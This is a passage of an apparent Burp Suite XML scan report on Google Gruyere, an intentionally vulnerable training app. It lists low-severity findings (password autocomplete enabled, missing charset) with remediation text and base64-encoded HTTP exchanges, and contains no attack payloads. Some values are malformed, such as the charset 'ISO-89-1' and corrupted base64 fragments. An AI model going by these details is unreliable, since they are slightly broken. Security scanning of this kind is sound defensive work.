W50Jz4KCgogIDxoMz5FZGl0IHlvdXIgcHJvZmlsZS48L2gzPgoKCgo8Zm9ybSBtZXRob2Q9J2dldCcgYWN0aW9uPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3NhdmVwcm9maWxlJz4KPGlucHV0IHR5cGU9J2hpZGRlbicgbmFtZT0nYWN0aW9uJyB2YWx1ZT0ndXBkYXRlJz4KPHRhYmxlPgogIDx0cj48dGQ+CiAgICBVc2VyIGlkOgogIDwvdGQ+PHRkPgoKCiAgCiAgICA1NTUtNTU1LTAxOTlAZXhhbXBsZS5jb20KICAKICAKCiAgPC90ZD48L3RyPgo8dHI+PHRkPgogICAgVXNlciBuYW1lOgogIDwvdGQ+PHRkPgogICAgPGlucHV0IHR5cGU9J3RleHQnCiAgICAgIHZhbHVlPSNTUtNTU1LTAxOTlAZXhhbXBsZS5jb20nCiAgICAgIG5hbWU9J25hbWUnIG1heGxlbmd0aD0nMTYnPgo8L3RkPjwvdHI+Cjx0cj48dGQ+CiAgICBPTEQgUGFzc3dvcmQ6CiAgPC90ZD48dGQ+CiAgICA8aW5wdXQgdHlwZT0ncGFzc3dvcmQnIG5hbWU9J29sZHB3Jz4KICA8L3RkPjx0ZD4KPC90ZD48L3RyPgo8dHI+PHRkPgogICAgTkVXIFBhc3N3b3JkOgogIDwvdGQ+PHRkPgogICAgPGlucHV0IHR5cGU9J3Bhc3N3b3JkJyBuYW1lPSdwdyc+CiAgICA8YnI+PHNwYW4gc3R5bGU9ImNvbG9yOnJlZCI+PGI+V0FSTklORzogR3J1eWVyZSBpcyBub3Qgc2VjdXJlLjxicj4KICAgIERvIG5vdCB1c2UgYSBwYXNzd29yZCB0aGF0IHlvdSB1c2UgZm9yIGFueSByZWFsIHNlcnZpY2UuPC9iPjwvc3Bhbj4KPC90ZD48L3RyPgo8dHI+PHRkPgogICAgSWNvbjoKICA8L3RkPjx0ZD4KICAgIDxpbnB1dCB0eXBlPSd0ZXh0JwogICAgICB2YWx1ZT0nJwogICAgICB2YWx1ZT0nJwogICAgICBuYW1lPSdpY29uJz4KICAgICgzMngzMiBpbWFnZSwgVVJMIHRvIGltYWdlIGxvY2F0aW9uKQo8L3RkPjwvdHI+Cjx0cj48dGQ+CiAgICBIb21lcGFnZToKICA8L3RkPjx0ZD4KICAgIDxpbnB1dCB0eXBlPSd0ZXh0JyBzaXplPSMCcKICAgICAgdmFsdWU9JycKICAgICAgbmFtZT0nd2ViX3NpdGUnPgo8L3RkPjwvdHI+Cjx0cj48dGQ+CiAgICBQcm9maWxlIENvbG9yOgogIDwvdGQ+PHRkPgogICAgPGlucHV0IHR5cGU9J3RleHQnCiAgICAgIHZhbHVlPScnCiAgICAgIG5hbWU9J2NvbG9yJz4KPC90ZD48L3RyPgo8dHI+PHRkPgogICAgUHJpdmF0ZSBTbmlwcGV0OgogIDwvdGQ+PHRkPgogICAgPHRleHRhcmVhIG5hbWU9J3ByaXZhdGVfc25pcHBldCcgcm93cz0nMTAnIHN0eWxlPSd3aWR0aDoxMDAlJz48L3RleHRhcmVhPgo8L3RkPjwvdHI+CgoKPHRyPjx0ZD48L3RkPjx0ZCBhbGlnbj0nbGVmdCc+CiAgICA8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nVXBkYXRlJz4KPC90ZD48L3RyPgo8L3RhYmxlPgo8L2Zvcm0+CjwvZGl2PgoKPC9ib2R5PgoKPC9odG1sPgoK]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>8929495281443582976</serialNumber>
    <type>5244928</type>
    <name><![CDATA[Password field with autocomplete enabled]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/editprofile.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/editprofile.gtl]]></location>
    <severity>Low</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Most browsers have a facility to remember user credentials that are entered into HTML forms. This function can be configured by the user and also by applications that employ user credentials. If the function is enabled, then credentials entered by the user are stored on their local computer and retrieved by the browser on future visits to the same application.</p>
<p>The stored credentials can be captured by an attacker who gains control over the user's computer. Further, an attacker who finds a separate application vulnerability such as cross-site scripting may be able to exploit this to retrieve a user's browser-stored credentials. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>To prevent browsers from storing credentials entered into HTML forms, include the attribute <b>autocomplete="off"</b> within the FORM tag (to protect all form fields) or within the relevant INPUT tags (to protect specific individual fields).</p>
<p>Please note that modern web browsers may ignore this directive. In spite of this there is a chance that not disabling autocomplete may cause problems obtaining PCI compliance.</p>]]></remediationBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/200.html">CWE-200: Information Exposure</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The page contains a form with the following action URL:<ul><li>http://google-gruyere.appspot.com/421683968655469260586300829583795792326/saveprofile</li></ul>The form contains the following password fields with autocomplete enabled:<ul><li>oldpw</li><li>pw</li></ul>]]></issueDetail>
    <issueDetailItems>
      <issueDetailItem><![CDATA[oldpw]]></issueDetailItem>
      <issueDetailItem><![CDATA[pw]]></issueDetailItem>
    </issueDetailItems>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3RsIEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogNGIyMDRlOGUwZDRiNjk2ZDMzNTZmNzE5ZTA0NDg2MWENClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MjoxMyBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogNDAwNQ0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IFByb2ZpbGU8L3RpdGxlPgo8c3R5bGU+Ci8qIENvcHlyaWdodCAyMDE3IEdvb2dsZSBJbmMuICovCgpib2R5LCBodG1sLCB0ZCwgc3BhbiwgZGl2LCBpbnB1dCwgdGV4dGFyZWEgewogIGZvbnQtZmFtaWx5OiBzYW5zLXNlcmlmOwogIGZvbnQtc2l6ZTogMTRwdDsKfQoKYm9keSB7CiAgYmFja2dyb3VuZDogdXJsKCdjaGVlc2UucG5nJykgdG9wIGNlbnRlciByZXBlYXQ7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIG9wYWNpdHk6IDAuODA7Cn0KCmgyIHsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgZm9udC1zaXplOiAzMHB0OwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9Cgp0ZCB7CiAgdmVydGljYWwtYWxpZ246IHRvcDsKICBwYWRkaW5nOiA1cHg7Cn0KCmEsIGE6aG92ZXIgewogIHRleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOwogIGNvbG9yOiAjMDAwMGJiOwp9CgphOnZpc2l0ZWQgewogIGNvbG9yOiAjYmIwMDAwOwp9CgphLmJ1dHRvbjp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDBiYjsKfQoKLmNvbnRlbnQgewogIHRleHQtYWxpZ246IGxlZnQ7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBwYWRkaW5nOiAyMHB4OwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIHBhZGRpbmc6IDEwcHggMjBweCAzNXB4IDIwcHg7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgd2lkdGg6IDkwJTsKICBiYWNrZ3JvdW5kOiAjZmZmZmNjOwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51LXVzZXIgewogIGNvbG9yOiAjMDAwMDAwOwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9CgojbWVudS1sZWZ0IHsKICBmbG9hdDogbGVmdDsKfQoKI21lbnUtbGVmdCBhLCAjbWVudS1sZWZ0IGE6aG92ZXIsICNtZW51LWxlZnQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKI21lbnUtcmlnaHQgewogIGZsb2F0OiByaWdodDsKfQoKI21lbnUtcmlnaHQgYSwgI21lbnUtcmlnaHQgYTpob3ZlciwgI21lbnUtcmlnaHQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKLm1lc3NhZ2UgewogIHdpZHRoOiA1MCU7CiAgY29sb3I6ICNmZjAwMDA7CiAgYmFja2dyb3VuZDogI2ZmZGRkZDsKICBib3JkZXI6IDJweCBzb2xpZCAjZmYwMDAwOwogIGJvcmRlci1yYWRpdXM6IDFlbTsKICAtbW96LWJvcmRlci1yYWRpdXM6IDFlbTsKICBwYWRkaW5nOiAxMHB4OwogIGZvbnQtd2VpZ2h0OiBib2xkOwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBtYXJnaW46IGF1dG87CiAgbWFyZ2luLXRvcDogMjBweDsKICBtYXJnaW4tYm90dG9tOiAyMHB4Owp9CgppbnB1dCwgdGV4dGFyZWEgewogIGJhY2tncm91bmQtY29sb3I6ICNmZmZmZmY7Cn0KCi5yZWZyZXNoIHsKICBmbG9hdDogY2VudGVyOwogIHdpZHRoOiA5MCU7CiAgdGV4dC1hbGlnbjogcmlnaHQ7CiAgbWFyZ2luOiBhdXRvOwogIHBhZGRpbmctdG9wOiAwOwogIHBhZGRpbmctYm90dG9tOiAycHQ7CiAgbWFyZ2luLXRvcDogMDsKICBtYXJnaW4tYm90dG9tOiAwOwp9CgouaDItd2l0aC1yZWZyZXNoIHsKICBtYXJnaW4tYm90dG9tOiAwOwp9Cgo8L3N0eWxlPgoKPC9oZWFkPgoKPGJvZHk+Cgo8ZGl2IGNsYXNzPSdtZW51Jz4KICA8c3BhbiBpZD0nbWVudS1sZWZ0Jz4KICAgIDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvJz5Ib21lPC9hPgogICAgICAKICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3NuaXBwZXRzLmd0bCc+TXkmbmJzcDtTbmlwcGV0czwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L25ld3NuaXBwZXQuZ3RsJz5OZXcmbmJzcDtTbmlwcGV0PC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvdXBsb2FkLmd0bCc+VXBsb2FkPC9hPgogICAgICAKICA8L3NwYW4+CiAgPHNwYW4gaWQ9J21lbnUtcmlnaHQnPgogICAgICAKICAgICAgPHNwYW4gY2xhc3M9J21lbnUtdXNlcic+CiAgICAgICAgNTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tICZsdDs1NTUtNTU1LTAxOTlAZXhhbXBsZS5jb20mZ3Q7CiAgICAgIDwvc3Bhbj4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4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]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2863490577225279488</serialNumber>
    <type>8389120</type>
    <name><![CDATA[HTML does not specify charset]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/editprofile.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/editprofile.gtl]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>If a  response states that it contains HTML content but does not specify a character set, then the browser may analyze the HTML and attempt to determine which character set it appears to be using. Even if the majority of the HTML actually employs a standard character set such as UTF-8, the presence of non-standard characters anywhere in the response may cause the browser to interpret the content using a different character set. This can have unexpected results, and can lead to cross-site scripting vulnerabilities in which non-standard encodings like UTF-7 can be used to bypass the application's defensive filters.</p>
<p>In most cases, the absence of a charset directive does not constitute a security flaw, particularly if the response contains static content. You should review the contents of affected responses, and the context in which they appear, to determine whether any vulnerability exists. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>For every response containing HTML content, the application should include within the Content-type header a directive specifying a standard recognized character set, for example <b>charset=ISO-89-1</b>.
</p>]]></remediationBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/16.html">CWE-16: Configuration</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/436.html">CWE-436: Interpretation Conflict</a></li>
</ul>]]></vulnerabilityClassifications>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3RsIEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogNGIyMDRlOGUwZDRiNjk2ZDMzNTZmNzE5ZTA0NDg2MWENClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MjoxMyBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogNDAwNQ0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IFByb2ZpbGU8L3RpdGxlPgo8c3R5bGU+Ci8qIENvcHlyaWdodCAyMDE3IEdvb2dsZSBJbmMuICovCgpib2R5LCBodG1sLCB0ZCwgc3BhbiwgZGl2LCBpbnB1dCwgdGV4dGFyZWEgewogIGZvbnQtZmFtaWx5OiBzYW5zLXNlcmlmOwogIGZvbnQtc2l6ZTogMTRwdDsKfQoKYm9keSB7CiAgYmFja2dyb3VuZDogdXJsKCdjaGVlc2UucG5nJykgdG9wIGNlbnRlciByZXBlYXQ7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIG9wYWNpdHk6IDAuODA7Cn0KCmgyIHsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgZm9udC1zaXplOiAzMHB0OwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9Cgp0ZCB7CiAgdmVydGljYWwtYWxpZ246IHRvcDsKICBwYWRkaW5nOiA1cHg7Cn0KCmEsIGE6aG92ZXIgewogIHRleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOwogIGNvbG9yOiAjMDAwMGJiOwp9CgphOnZpc2l0ZWQgewogIGNvbG9yOiAjYmIwMDAwOwp9CgphLmJ1dHRvbjp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDBiYjsKfQoKLmNvbnRlbnQgewogIHRleHQtYWxpZ246IGxlZnQ7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBwYWRkaW5nOiAyMHB4OwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIHBhZGRpbmc6IDEwcHggMjBweCAzNXB4IDIwcHg7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgd2lkdGg6IDkwJTsKICBiYWNrZ3JvdW5kOiAjZmZmZmNjOwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51LXVzZXIgewogIGNvbG9yOiAjMDAwMDAwOwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9CgojbWVudS1sZWZ0IHsKICBmbG9hdDogbGVmdDsKfQoKI21lbnUtbGVmdCBhLCAjbWVudS1sZWZ0IGE6aG92ZXIsICNtZW51LWxlZnQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKI21lbnUtcmlnaHQgewogIGZsb2F0OiByaWdodDsKfQoKI21lbnUtcmlnaHQgYSwgI21lbnUtcmlnaHQgYTpob3ZlciwgI21lbnUtcmlnaHQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKLm1lc3NhZ2UgewogIHdpZHRoOiA1MCU7CiAgY29sb3I6ICNmZjAwMDA7CiAgYmFja2dyb3VuZDogI2ZmZGRkZDsKICBib3JkZXI6IDJweCBzb2xpZCAjZmYwMDAwOwogIGJvcmRlci1yYWRpdXM6IDFlbTsKICAtbW96LWJvcmRlci1yYWRpdXM6IDFlbTsKICBwYWRkaW5nOiAxMHB4OwogIGZvbnQtd2VpZ2h0OiBib2xkOwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBtYXJnaW46IGF1dG87CiAgbWFyZ2luLXRvcDogMjBweDsKICBtYXJnaW4tYm90dG9tOiAyMHB4Owp9CgppbnB1dCwgdGV4dGFyZWEgewogIGJhY2tncm91bmQtY29sb3I6ICNmZmZmZmY7Cn0KCi5yZWZyZXNoIHsKICBmbG9hdDogY2VudGVyOwogIHdpZHRoOiA5MCU7CiAgdGV4dC1hbGlnbjogcmlnaHQ7CiAgbWFyZ2luOiBhdXRvOwogIHBhZGRpbmctdG9wOiAwOwogIHBhZGRpbmctYm90dG9tOiAycHQ7CiAgbWFyZ2luLXRvcDogMDsKICBtYXJnaW4tYm90dG9tOiAwOwp9CgouaDItd2l0aC1yZWZyZXNoIHsKICBtYXJnaW4tYm90dG9tOiAwOwp9Cgo8L3N0eWxlPgoKPC9oZWFkPgoKPGJvZHk+Cgo8ZGl2IGNsYXNzPSdtZW51Jz4KICA8c3BhbiBpZD0nbWVudS1sZWZ0Jz4KICAgIDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvJz5Ib21lPC9hPgogICAgICAKICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3NuaXBwZXRzLmd0bCc+TXkmbmJzcDtTbmlwcGV0czwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L25ld3NuaXBwZXQuZ3RsJz5OZXcmbmJzcDtTbmlwcGV0PC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvdXBsb2FkLmd0bCc+VXBsb2FkPC9hPgogICAgICAKICA8L3NwYW4+CiAgPHNwYW4gaWQ9J21lbnUtcmlnaHQnPgogICAgICAKICAgICAgPHNwYW4gY2xhc3M9J21lbnUtdXNlcic+CiAgICAgICAgNTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tICZsdDs1NTUtNTU1LTAxOTlAZXhhbXBsZS5jb20mZ3Q7CiAgICAgIDwvc3Bhbj4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9lZGl0cHJvZmlsZS5ndGwnPlByb2ZpbGU8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9sb2dvdXQnPlNpZ24gb3V0PC9hPgogICAgICAKICAgICAgCiAgPC9zcGFuPgo8L2Rpdj4KCjxkaXY+CjxoMj5HcnV5ZXJlOiBQcm9maWxlPC9oMj4KPC9kaXY+Cgo8ZGl2IGNsYXNzPSdjb250ZW50Jz4KCgogIDxoMz5FZGl0IHlvdXIgcHJvZmlsZS48L2gzPgoKCgo8Zm9ybSBtZXRob2Q9J2dldCcgYWN0aW9uPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3NhdmVwcm9maWxlJz4KPGlucHV0IHR5cGU9J2hpZGRlbicgbmFtZT0nYWN0aW9uJyB2YWx1ZT0ndXBkYXRlJz4KPHRhYmxlPgogIDx0cj48dGQ+CiAgICBVc2VyIGlkOgogIDwvdGQ+PHRkPgoKCiAgCiAgICA1NTUtNTU1LTAxOTlAZXhhbXBsZS5jb20KICAKICAKCiAgPC90ZD48L3RyPgo8dHI+PHRkPgogICAgVXNlciBuYW1lOgogIDwvdGQ+PHRkPgogICAgPGlucHV0IHR5cGU9J3RleHQnCiAgICAgIHZhbHVlPSNTUtNTU1LTAxOTlAZXhhbXBsZS5jb20nCiAgICAgIG5hbWU9J25hbWUnIG1heGxlbmd0aD0nMTYnPgo8L3RkPjwvdHI+Cjx0cj48dGQ+CiAgICBPTEQgUGFzc3dvcmQ6CiAgPC90ZD48dGQ+CiAgICA8aW5wdXQgdHlwZT0ncGFzc3dvcmQnIG5hbWU9J29sZHB3Jz4KICA8L3RkPjx0ZD4KPC90ZD48L3RyPgo8dHI+PHRkPgogICAgTkVXIFBhc3N3b3JkOgogIDwvdGQ+PHRkPgogICAgPGlucHV0IHR5cGU9J3Bhc3N3b3JkJyBuYW1lPSdwdyc+CiAgICA8YnI+PHNwYW4gc3R5bGU9ImNvbG9yOnJlZCI+PGI+V0FSTklORzogR3J1eWVyZSBpcyBub3Qgc2VjdXJlLjxicj4KICAgIERvIG5vdCB1c2UgYSBwYXNzd29yZCB0aGF0IHlvdSB1c2UgZm9yIGFueSByZWFsIHNlcnZpY2UuPC9iPjwvc3Bhbj4KPC90ZD48L3RyPgo8dHI+PHRkPgogICAgSWNvbjoKICA8L3RkPjx0ZD4KICAgIDxpbnB1dCB0eXBlPSd0ZXh0JwogICAgICB2YWx1ZT0nJwogICAgICB2YWx1ZT0nJwogICAgICBuYW1lPSdpY29uJz4KICAgICgzMngzMiBpbWFnZSwgVVJMIHRvIGltYWdlIGxvY2F0aW9uKQo8L3RkPjwvdHI+Cjx0cj48dGQ+CiAgICBIb21lcGFnZToKICA8L3RkPjx0ZD4KICAgIDxpbnB1dCB0eXBlPSd0ZXh0JyBzaXplPSMCcKICAgICAgdmFsdWU9JycKICAgICAgbmFtZT0nd2ViX3NpdGUnPgo8L3RkPjwvdHI+Cjx0cj48dGQ+CiAgICBQcm9maWxlIENvbG9yOgogIDwvdGQ+PHRkPgogICAgPGlucHV0IHR5cGU9J3RleHQnCiAgICAgIHZhbHVlPScnCiAgICAgIG5hbWU9J2NvbG9yJz4KPC90ZD48L3RyPgo8dHI+PHRkPgogICAgUHJpdmF0ZSBTbmlwcGV0OgogIDwvdGQ+PHRkPgogICAgPHRleHRhcmVhIG5hbWU9J3ByaXZhdGVfc25pcHBldCcgcm93cz0nMTAnIH